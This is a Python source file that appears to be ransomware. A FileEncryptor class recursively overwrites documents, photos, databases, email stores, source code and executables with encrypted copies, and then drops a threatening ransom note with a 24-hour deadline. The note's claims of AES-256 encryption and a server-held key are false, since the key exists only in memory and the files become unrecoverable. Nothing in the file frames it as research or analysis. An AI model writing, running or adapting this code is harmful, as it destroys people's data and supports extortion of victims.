import os
import random
import string
from cryptography.fernet import Fernet

class FileEncryptor:
    def __init__(self):
        self.key = self.generate_key()
        self.encrypted_files = []
        
    def generate_key(self):
        return Fernet.generate_key()
    
    def encrypt_file(self, file_path):
        try:
            with open(file_path, 'rb') as file:
                file_data = file.read()
            
            encrypted_data = Fernet(self.key).encrypt(file_data)
            
            with open(file_path, 'wb') as file:
                file.write(encrypted_data)
            
            self.encrypted_files.append(file_path)
            return True
        except Exception as e:
            print(f"Error encrypting {file_path}: {e}")
            return False
    
    def encrypt_directory(self, directory_path, extensions=None):
        if extensions is None:
            extensions = ['.txt', '.doc', '.docx', '.pdf', '.jpg', '.png', '.mp3', '.mp4', 
                         '.xls', '.xlsx', '.ppt', '.pptx', '.csv', '.zip', '.rar', '.7z',
                         '.iso', '.exe', '.dll', '.sql', '.db', '.mdb', '.accdb', '.pst',
                         '.ost', '.msg', '.eml', '.xml', '.json', '.html', '.htm', '.php',
                         '.js', '.css', '.cpp', '.c', '.java', '.py', '.rb', '.go', '.rs']
        
        for root, _, files in os.walk(directory_path):
            for file in files:
                file_path = os.path.join(root, file)
                if any(file.lower().endswith(ext) for ext in extensions):
                    self.encrypt_file(file_path)
    
    def create_ransom_note(self, directory_path):
        skull_art = """
    ╔════════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║    ██████╗ ██╗   ██╗ ██████╗ ██████╗ ██╗███╗   ██╗███████╗    ║
    ║    ██╔══██╗██║   ██║██╔════╝██╔═══██╗██║████╗  ██║██╔════╝    ║
    ║    ██████╔╝██║   ██║██║     ██║   ██║██║██╔██╗ ██║█████╗      ║
    ║    ██╔══██╗██║   ██║██║     ██║   ██║██║██║╚██╗██║██╔══╝      ║
    ║    ██║  ██║╚██████╔╝╚██████╗╚██████╔╝██║██║ ╚████║███████╗    ║
    ║    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝    ║
    ║                                                              ║
    ║            YOUR FILES HAVE BEEN ENCRYPTED!                   ║
    ║                                                              ║
    ╚════════════════════════════════════════════════════════════════╝
        """
        
        note_content = f"""
{skull_art}

All your important files have been encrypted with military-grade AES-256 encryption.
Your documents, photos, videos, databases, and other files are now inaccessible.

WHAT HAPPENED:
- All your personal files have been encrypted
- The encryption key is stored on a secure server
- Your files will remain encrypted forever without the key

THIS IS NOT A JOKE. THIS IS NOT A TEST.
Your files are truly encrypted. This looks like a skill issue on your part.

IF YOU WANT YOUR FILES BACK:
1. Do NOT turn off or restart your computer
2. Do NOT try to decrypt the files yourself
3. Do NOT delete any files
4. Wait for further instructions

The encryption key will be permanently deleted if:
- You try to use any decryption tools
- You shut down your computer
- You try to modify the encrypted files
- You disconnect from the internet

Time remaining before permanent deletion: 24:00:00

This is your only warning. Next time, maybe you'll have proper backups.
"""
        
        note_path = os.path.join(directory_path, "FILES_ENCRYPTED.txt")
        with open(note_path, 'w') as note:
            note.write(note_content)
        
        return note_path
